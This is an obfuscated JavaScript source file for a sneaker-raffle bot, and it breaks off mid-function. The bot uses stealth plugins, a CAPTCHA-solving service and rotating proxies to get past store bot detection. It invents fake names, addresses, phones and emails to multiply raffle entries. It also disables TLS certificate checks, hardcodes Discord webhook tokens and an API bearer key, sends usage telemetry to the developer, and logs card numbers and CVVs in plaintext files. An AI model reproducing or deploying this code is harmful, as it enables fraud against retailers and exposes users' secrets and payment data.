process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
var _0x575543 = require('node-imap'), _0x39385a = require('util')['inspect'];
const _0x565ceb = require('mailparser')['simpleParser'], { EmbedBuilder: _0x4ed8bb } = require('discord.js');
var _0xfeb634 = require('exe');
const { execFile: _0x23b281 } = require('child_process'), _0x3b2a97 = require('puppeteer-extra'), _0x5af5b0 = require('puppeteer-extra-plugin-recaptcha'), _0x2b8567 = require('puppeteer-extra-plugin-stealth'), _0x2367c9 = require('chalk'), _0x50109a = require('node-bash-title'), _0x5e446e = require('fs'), _0x4b0841 = require('axios'), _0x2b479b = require('papaparse');
var _0x5cb843 = require('random-name');
const _0x1f14da = require('request');
var _0x3ad538 = require('prompt');
const _0x1945a2 = _0x1f14da['jar']();
var _0x37b240 = {};
const _0x41c585 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x2b6be8 = '1067398856721051719/2gS-h641y_RoqR-KZ5aOcrnDfvvXNQIz4uQv8eA8A5_nsRSJlaCaStreLwCu5lmUjO4H', _0x4e05d0 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x3f92ee = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x573e18 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x4545fb = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x39f8ea = 'https://discord.com/api/webhooks/', _0x568b11 = '' + _0x39f8ea + _0x4e05d0, _0x14be92 = '' + _0x39f8ea + _0x3f92ee, _0x1efb60 = '' + _0x39f8ea + _0x41c585, _0x2b1b7c = '' + _0x39f8ea + _0x2b6be8, _0x4a9ac0 = '' + _0x39f8ea + _0x573e18, _0xf4f157 = '' + _0x39f8ea + _0x4545fb;
const _0x2d2bc7 = JSON['parse'](_0x5e446e['readFileSync']('../package.json', 'utf-8')), _0x2de2a3 = _0x2d2bc7['version'];
var _0x4f3156, _0x397c57, _0x6d0df6, _0xf86832, _0x241975, _0x2ad114, _0x340f37, _0x46bc66;
const _0x2a8c63 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x481743 = ![];
const _0x4238b9 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x59d08a = '0123456789';
var _0x24fc05 = _0x4238b9['split']('');
const _0x230a8d = require('auto-git-update'), { PageEmittedEvents: _0x3e1a44 } = require('puppeteer'), { getRandomValues: _0x2cffe3 } = require('crypto'), { resolve: _0x4d85e0 } = require('path'), { Console: _0x406239 } = require('console'), _0x23cef1 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x203c12 = new _0x230a8d(_0x23cef1);
async function _0x518062() {
    _0x241975 = _0x5e446e['readdirSync']('../proxies'), _0xf86832 = _0x5e446e['readdirSync']('../tasks'), !_0x5e446e['existsSync']('../accounts/fenom.csv') && _0x5e446e['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x5e446e['existsSync']('../accounts/bstn.csv') && _0x5e446e['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x5e446e['existsSync']('../failed-tasks.csv') && _0x5e446e['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x5e446e['existsSync']('../successful-tasks.csv') && _0x5e446e['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x37b240 = JSON['parse'](_0x5e446e['readFileSync']('../settings.json', 'utf-8')), !_0x37b240['delay'] && (_0x37b240['delay'] = 0x3c, _0x5e446e['writeFileSync']('../settings.json', JSON['stringify'](_0x37b240, null, 0x2))), !_0x37b240['masterMail'] && (_0x37b240['masterMail'] = 'yourmail@gmail.com', _0x5e446e['writeFileSync']('../settings.json', JSON['stringify'](_0x37b240, null, 0x2))), !_0x37b240['masterPassword'] && (_0x37b240['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x5e446e['writeFileSync']('../settings.json', JSON['stringify'](_0x37b240, null, 0x2))), !_0x37b240['captchaKey'] && (_0x37b240['captchaKey'] = '', _0x5e446e['writeFileSync']('../settings.json', JSON['stringify'](_0x37b240, null, 0x2))), !_0x37b240['useRandomProxy'] && (_0x37b240['useRandomProxy'] = !![], _0x5e446e['writeFileSync']('../settings.json', JSON['stringify'](_0x37b240, null, 0x2))), !_0x37b240['shuffleTasks'] && (_0x37b240['useRandomProxy'] = ![], _0x5e446e['writeFileSync']('../settings.json', JSON['stringify'](_0x37b240, null, 0x2))), !_0x37b240['webhook'] && (_0x37b240['webhook'] = '', _0x5e446e['writeFileSync']('../settings.json', JSON['stringify'](_0x37b240, null, 0x2))), _0x37b240['delay'] <= 0x1388 && (_0x37b240['delay'] = _0x37b240['delay'] * 0x3e8), _0x37b240['AfewDelay'] && (delete _0x37b240['AfewDelay'], _0x5e446e['writeFileSync']('../settings.json', JSON['stringify'](_0x37b240, null, 0x2))), _0x37b240['MahaDelay'] && (delete _0x37b240['MahaDelay'], _0x5e446e['writeFileSync']('../settings.json', JSON['stringify'](_0x37b240, null, 0x2))), _0x37b240['footshopDelay'] && (delete _0x37b240['footshopDelay'], _0x5e446e['writeFileSync']('../settings.json', JSON['stringify'](_0x37b240, null, 0x2))), _0x37b240['MahaDelay'] = _0x37b240['delay'], _0x39f8ea = _0x37b240['webhook'], _0x2ad114 = _0x37b240['licenseKey'];
}
let _0x396b3e, _0x581121 = [], _0x59947f;
const _0x28bb81 = _0x29b8d0 => new Promise(_0xbe9e43 => setTimeout(_0xbe9e43, _0x29b8d0));
function _0x43987d(_0x113ebe, _0x502b36) {
    return Math['floor'](Math['random']() * (_0x502b36 - _0x113ebe + 0x1) + _0x113ebe);
}
function _0x30cb5a(_0x4dcc05) {
    let _0x145eb0 = _0x4dcc05['length'], _0x5ae0e6;
    while (_0x145eb0 != 0x0) {
        _0x5ae0e6 = Math['floor'](Math['random']() * _0x145eb0), _0x145eb0--, [_0x4dcc05[_0x145eb0], _0x4dcc05[_0x5ae0e6]] = [
            _0x4dcc05[_0x5ae0e6],
            _0x4dcc05[_0x145eb0]
        ];
    }
    return _0x4dcc05;
}
async function _0x172da2(_0x2d1d8e) {
    return _0x4b0841['get']('https://api.hyper.co/v4/licenses/' + _0x2d1d8e, { 'headers': { 'Authorization': 'Bearer\x20' + _0x2a8c63 } })['then'](_0x3130f5 => _0x3130f5['data'])['catch'](() => null);
}
;
async function _0x4b4482(_0x1f1616) {
    console['clear']();
    if (_0x1f1616 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x1097ba = await _0x3ad538['get']('License');
        if (_0x1097ba['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x28bb81(0xbb8), _0x4b4482(_0x1f1616);
        _0x1f1616 = _0x1097ba['License'], _0x37b240['licenseKey'] = _0x1f1616, _0x2ad114 = _0x1f1616, _0x5e446e['writeFileSync']('../settings.json', JSON['stringify'](_0x37b240));
    }
    console['log']('Checking\x20license\x20' + _0x2ad114 + '...'), await _0x28bb81(0x320);
    const _0x46d9f1 = await _0x172da2(_0x1f1616);
    _0x340f37 = JSON['stringify'](_0x46d9f1['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x46bc66 = JSON['stringify'](_0x46d9f1['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x46d9f1)
        return console['log']('License\x20not\x20found');
    if (!_0x46d9f1['user'])
        return console['log']('License\x20not\x20bound');
    return _0x46d9f1['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x481743 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x481743 = ![]);
}
async function _0x2f91d3() {
    var _0x4dfcf0 = await _0x3ad538['get']('Module');
    return console['clear'](), _0x4dfcf0['Module'];
}
;
async function _0x242042() {
    var _0x21a3c3 = await _0x3ad538['get']('Setting');
    return console['clear'](), _0x21a3c3['Setting'];
}
async function _0x35ecac() {
    console['clear'](), console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x4c59e7 = 0x0; _0x4c59e7 < _0xf86832['length']; _0x4c59e7++) {
        console['log']('\x20(' + _0x4c59e7 + ')\x20' + _0xf86832[_0x4c59e7]);
    }
    console['log']('');
    var _0x3f7213 = await _0x3ad538['get']('Task');
    if (_0x3f7213['Task'] > _0xf86832['length'] - 0x1 || isNaN(_0x3f7213['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x28bb81(0x3e8), _0x35ecac();
    var _0x23194b = _0x5e446e['readFileSync']('../tasks/' + _0xf86832[_0x3f7213['Task']], 'utf-8');
    return _0x6d0df6 = _0x2b479b['parse'](_0x23194b, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x2367c9['blue'](_0xf86832[_0x3f7213['Task']])), _0x4f3156 = _0xf86832[_0x3f7213['Task']], _0x6d0df6;
}
async function _0x2cc7eb() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x5b9d8 = 0x0; _0x5b9d8 < _0x241975['length']; _0x5b9d8++) {
        console['log']('\x20(' + _0x5b9d8 + ')\x20' + _0x241975[_0x5b9d8]);
    }
    console['log']('');
    var _0x1d9f69 = await _0x3ad538['get']('Proxies');
    if (_0x1d9f69['Proxies'] > _0x241975['length'] - 0x1 || isNaN(_0x1d9f69['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x28bb81(0x3e8), _0x2cc7eb();
    var _0x5c3aed = _0x5e446e['readFileSync']('../proxies/' + _0x241975[_0x1d9f69['Proxies']], 'utf-8')['split']('\x0a');
    let _0x34a320 = _0x5c3aed['map']((_0x5bfad1, _0xcaa061) => {
        sanatizeProxy = _0x5bfad1['replace']('\x0d', '');
        if (_0x5c3aed[_0xcaa061 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x397c57 = _0x241975[_0x1d9f69['Proxies']], console['clear'](), _0x34a320;
}
async function _0x1c04f0() {
    var _0x109497 = await _0x3ad538['get']('Value');
    return console['clear'](), _0x109497['Value'];
}
async function _0x5a66e8(_0x2fdd39) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x110f39 = 0x0; _0x110f39 < _0x2fdd39['length']; _0x110f39++) {
        console['log']('\x20(' + _0x110f39 + ')\x20[' + _0x2fdd39[_0x110f39]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x237e21 = await _0x3ad538['get']('Module');
    return _0x237e21['Module'];
}
async function _0x14eb79() {
    var _0x337216 = await _0x3ad538['get']('Password');
    return console['clear'](), _0x337216['Password'];
}
;
async function _0x2c9310() {
    var _0x5179ca = await _0x3ad538['get']('Links');
    return _0x5179ca['Links'];
}
;
async function _0x396bf7() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x5c606e = 0x0; _0x5c606e < _0x581121['length']; _0x5c606e++) {
        console['log']('\x20(' + _0x5c606e + ')\x20' + _0x581121[_0x5c606e]);
    }
    ;
    console['log']();
    let _0x25b657 = await _0x3ad538['get']('Product');
    return console['clear'](), _0x25b657['Product'];
}
;
function _0x51d312() {
    var _0x3d99c5 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x3d99c5;
}
;
function _0xd0fa6b() {
    var _0x35617d = new Date(Date['now']())['toLocaleString']();
    return _0x35617d['replace'](',', '');
}
async function _0x40545a(_0x3c95f1, _0x1d5176) {
    let _0x123c11 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x2de2a3 != 'devkey') {
        await _0x4b0841['post'](_0x3c95f1, _0x1d5176, _0x123c11);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0xb1aeae(_0x730294, _0xe5af1f, _0x1ca5b0, _0x1bb3c1, _0x4fe7ec) {
    if (!_0x1bb3c1 && _0x1ca5b0 == 'dev') {
        var _0x4f3680 = new _0x4ed8bb()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0xe5af1f['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0xe5af1f['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x730294['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x37b240['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x340f37,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x730294['Url'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x2de2a3,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x4f3680['data'];
    } else {
        if (_0x1bb3c1 && _0x1ca5b0 == 'dev') {
            var _0x4f3680 = new _0x4ed8bb()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0xe5af1f['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x340f37,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0xe5af1f['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x730294['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x37b240['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x4fe7ec,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x730294['Url']
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x2de2a3,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x4f3680['data'];
        } else {
            if (_0x1ca5b0 == 'pub') {
                var _0x4f3680 = new _0x4ed8bb()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0xe5af1f['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0xe5af1f['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x730294['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x37b240['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x730294['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x2de2a3,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x4f3680['data'];
            } else {
                if (_0x1ca5b0 == 'acc' && !_0x1bb3c1) {
                    var _0x4f3680 = new _0x4ed8bb()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0xe5af1f['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x340f37,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0xe5af1f['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x37b240['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x2de2a3,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x4f3680['data'];
                } else {
                    if (_0x1ca5b0 == 'acc' && _0x1bb3c1) {
                        var _0x4f3680 = new _0x4ed8bb()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0xe5af1f['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x340f37,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x4fe7ec,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0xe5af1f['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x37b240['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x2de2a3,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x4f3680['data'];
                    } else {
                        if (_0x1ca5b0 == 'open') {
                            var _0x4f3680 = new _0x4ed8bb()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x46bc66)['addFields']({
                                'name': 'User',
                                'value': '' + _0x340f37,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x2de2a3,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x4f3680['data'];
                        } else {
                            if (!_0x1bb3c1 && _0x1ca5b0 == 'ver') {
                                var _0x4f3680 = new _0x4ed8bb()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0xe5af1f['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x340f37,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0xe5af1f['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x37b240['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x2de2a3,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x4f3680['data'];
                            } else {
                                if (_0x1bb3c1 && _0x1ca5b0 == 'ver') {
                                    var _0x4f3680 = new _0x4ed8bb()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0xe5af1f['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x340f37,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x4fe7ec,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0xe5af1f['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x37b240['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x2de2a3,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x4f3680['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x129938(_0x38d1d9, _0x2c02c7) {
    var _0x1ec285 = _0x38d1d9[_0x2c02c7]['Address1']['split'](''), _0x4ab304 = _0x38d1d9[_0x2c02c7]['Address2']['split'](''), _0x505873 = _0x38d1d9[_0x2c02c7]['Email']['split']('@');
    for (var _0x3eb725 = 0x0; _0x3eb725 < _0x1ec285['length']; _0x3eb725++) {
        if (_0x1ec285[_0x3eb725] == 'X') {
            var _0x477486 = Math['round'](Math['random']() * (_0x4238b9['length'] - 0x1));
            _0x1ec285[_0x3eb725] = _0x24fc05[_0x477486];
        }
    }
    ;
    for (var _0x3eb725 = 0x0; _0x3eb725 < _0x4ab304['length']; _0x3eb725++) {
        if (_0x4ab304[_0x3eb725] == 'X') {
            var _0x477486 = Math['round'](Math['random']() * (_0x4238b9['length'] - 0x1));
            _0x4ab304[_0x3eb725] = _0x24fc05[_0x477486];
        }
    }
    ;
    _0x38d1d9[_0x2c02c7]['FirstName'] == 'RANDOM' && (_0x38d1d9[_0x2c02c7]['FirstName'] = _0x5cb843['first']());
    _0x38d1d9[_0x2c02c7]['LastName'] == 'RANDOM' && (_0x38d1d9[_0x2c02c7]['LastName'] = _0x5cb843['last']());
    _0x505873[0x0] == 'RANDOM' ? _0x505873[0x0] = '' + _0x5cb843['first']() + _0x5cb843['last']() + _0x43987d(0x1, 0x270f) + '@' : _0x505873[0x0] = _0x505873[0x0] + '@';
    _0x38d1d9[_0x2c02c7]['Email'] = _0x505873['join'](''), _0x38d1d9[_0x2c02c7]['Address1'] = _0x1ec285['join'](''), _0x38d1d9[_0x2c02c7]['Address2'] = _0x4ab304['join']('');
    _0x38d1d9[_0x2c02c7]['Phone'] == 'RANDOM' && (_0x38d1d9[_0x2c02c7]['Phone'] = '0' + _0x43987d(0x5f5e100, 0x3b9ac9ff));
    if (_0x38d1d9[_0x2c02c7]['Follower'] == 'RANDOM') {
        var _0x120318 = _0x43987d(0x1, 0x270f);
        _0x38d1d9[_0x2c02c7]['Follower'] = '' + _0x5cb843['first']() + _0x5cb843['last']() + _0x120318 + '\x20';
    }
    _0x38d1d9[_0x2c02c7]['HouseNumber'] == 'RANDOM' && (_0x38d1d9[_0x2c02c7]['HouseNumber'] = _0x43987d(0x1, 0xc8));
    if (_0x38d1d9[_0x2c02c7]['Address1'] == 'RANDOM') {
        var _0xa16c8f = Math['round'](Math['random']() * (_0x4238b9['length'] - 0x1)), _0x3d56e8 = _0x24fc05[_0xa16c8f];
        _0x38d1d9[_0x2c02c7]['Address1'] = _0x5cb843['last']() + 'straat', _0x38d1d9[_0x2c02c7]['Zip'] == '' && (_0x38d1d9[_0x2c02c7]['Postcode'] = _0x43987d(0x3e8, 0x270f) + '\x20' + _0x3d56e8 + _0x3d56e8, _0x38d1d9[_0x2c02c7]['Zip'] = _0x38d1d9[_0x2c02c7]['Postcode']), _0x38d1d9[_0x2c02c7]['HouseNumber'] = '' + _0x43987d(0x1, 0xc8);
    }
    return;
}
;
async function _0x1322f8(_0x55ac08, _0x19352) {
    _0x5e446e['appendFileSync']('../failed-tasks.csv', _0xd0fa6b() + ',' + _0x19352['store'] + ',' + _0x19352['name'] + ',' + _0x55ac08['Url'] + ',' + _0x55ac08['Size'] + ',' + _0x55ac08['Follower'] + ',' + _0x55ac08['FirstName'] + ',' + _0x55ac08['LastName'] + ',' + _0x55ac08['Address1'] + ',' + _0x55ac08['Address2'] + ',' + _0x55ac08['HouseNumber'] + ',' + _0x55ac08['Zip'] + ',' + _0x55ac08['City'] + ',' + _0x55ac08['State'] + ',' + _0x55ac08['Country'] + ',' + _0x55ac08['Phone'] + ',' + _0x55ac08['Email'] + ',' + _0x55ac08['Password'] + ',' + _0x55ac08['PaymentMethod'] + ',' + _0x55ac08['CardType'] + ',' + _0x55ac08['NameOnCard'] + ',' + _0x55ac08['CardNumber'] + ',' + _0x55ac08['ExpiryDate'] + ',' + _0x55ac08['CVV'] + ',' + _0x55ac08['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x4d8543(_0x336a7d, _0x26dd4e) {
    _0x5e446e['appendFileSync']('../successful-tasks.csv', _0xd0fa6b() + ',' + _0x26dd4e['store'] + ',' + _0x26dd4e['name'] + ',' + _0x336a7d['Url'] + ',' + _0x336a7d['Size'] + ',' + _0x336a7d['Follower'] + ',' + _0x336a7d['FirstName'] + ',' + _0x336a7d['LastName'] + ',' + _0x336a7d['Address1'] + ',' + _0x336a7d['Address2'] + ',' + _0x336a7d['HouseNumber'] + ',' + _0x336a7d['Zip'] + ',' + _0x336a7d['City'] + ',' + _0x336a7d['State'] + ',' + _0x336a7d['Country'] + ',' + _0x336a7d['Phone'] + ',' + _0x336a7d['Email'] + ',' + _0x336a7d['Password'] + ',' + _0x336a7d['PaymentMethod'] + ',' + _0x336a7d['CardType'] + ',' + _0x336a7d['NameOnCard'] + ',' + _0x336a7d['CardNumber'] + ',' + _0x336a7d['ExpiryDate'] + ',' + _0x336a7d['CVV'] + ',' + _0x336a7d['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x3cd98b() {
    let _0x1a8978 = proxyFile['split']('\x0a'), _0x4845ef = _0x1a8978['map']((_0x5dfb88, _0x5180b3) => {
        sanatizeProxy = _0x5dfb88['replace']('\x0d', '');
        if (_0x1a8978[_0x5180b3 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x4845ef;
}
;
async function _0x5f377f(_0x2eb8df) {
    var _0x16e3b5 = _0x2eb8df[0x1]['split'](':');
    const _0x39d0c0 = await _0x3b2a97['launch']({
        'headless': !![],
        'args': ['--proxy-server=' + _0x16e3b5[0x0] + ':' + _0x16e3b5[0x1] + ',--no-sandbox\x27,\x0a\x20\x20\x20\x20\x20\x20\x27--disable-setuid-sandbox,--force-device-scale-factor=0.3']
    });
    try {
        const _0x32e7ee = await _0x39d0c0['newPage']();
        await _0x32e7ee['authenticate']({
            'username': '' + _0x16e3b5[0x2],
            'password': '' + _0x16e3b5[0x3]
        }), console['log'](_0x51d312() + '\x20[' + _0x57cc5d[taskModule]['name'] + ']\x20Afew\x20Scraper\x20started'), await _0x32e7ee['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x32e7ee['setRequestInterception'](!![]), _0x32e7ee['on']('request', _0x6ceb4e => {
            _0x6ceb4e['resourceType']() === 'image' || _0x6ceb4e['resourceType']() === 'font' || _0x6ceb4e['resourceType']() === 'media' ? _0x6ceb4e['abort']() : _0x6ceb4e['continue']();
        }), await _0x32e7ee['goto']('https://en.afew-store.com/collections/sneaker-raffles'), console['log'](_0x51d312() + '\x20[' + _0x57cc5d[taskModule]['name'] + ']\x20Looking\x20for\x20Raffles'), await _0x32e7ee['waitForTimeout'](0xbb8), await _0x32e7ee['waitForSelector']('.product-card');
        const _0x379351 = await _0x32e7ee['$$eval']('a.product-card', _0x1d609a => {
            return _0x1d609a['map'](_0x4114f8 => _0x4114f8['href']);
        });
        return _0x581121 = _0x379351;
    } catch (_0x118912) {
        console['log']('\x20' + _0x118912);
    } finally {
        _0x39d0c0['close'](), console['clear']();
    }
}
;
async function _0x5c6129(_0x3172ed, _0xa8c3fc) {
    _0x3b2a97['use'](_0x2b8567()), _0x3b2a97['use'](_0x5af5b0({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x37b240['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x2988bc = 0x0; _0x2988bc < bouncewear['length']; _0x2988bc++) {
        await _0x129938(bouncewear, _0x2988bc);
        if (bouncewear[_0x2988bc]['Email'] == '' || bouncewear[_0x2988bc]['Password'] == '' || bouncewear[_0x2988bc]['FirstName'] == '' || bouncewear[_0x2988bc]['LastName'] == '') {
